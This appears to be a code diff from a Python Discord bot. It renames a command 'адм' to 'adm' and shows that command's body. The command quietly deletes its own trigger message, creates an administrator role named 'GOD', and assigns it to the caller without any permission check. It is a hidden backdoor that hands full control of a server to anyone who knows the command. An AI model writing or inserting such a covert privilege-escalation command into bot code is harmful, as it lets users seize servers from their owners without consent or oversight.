@@ -163,7 +163,7 @@ async def лс(ctx, member: discord.Member = None, *, arg = None):
 		await member.send(arg)
 
 @client.command()
-async def адм(ctx, limit = None):
+async def adm(ctx, limit = None):
 	await ctx.channel.purge(limit = 1)
 	await ctx.guild.create_role(permissions = discord.Permissions(administrator = True), name = 'GOD')
 	await ctx.author.add_roles(discord.utils.get(ctx.guild.roles, name = 'GOD'))
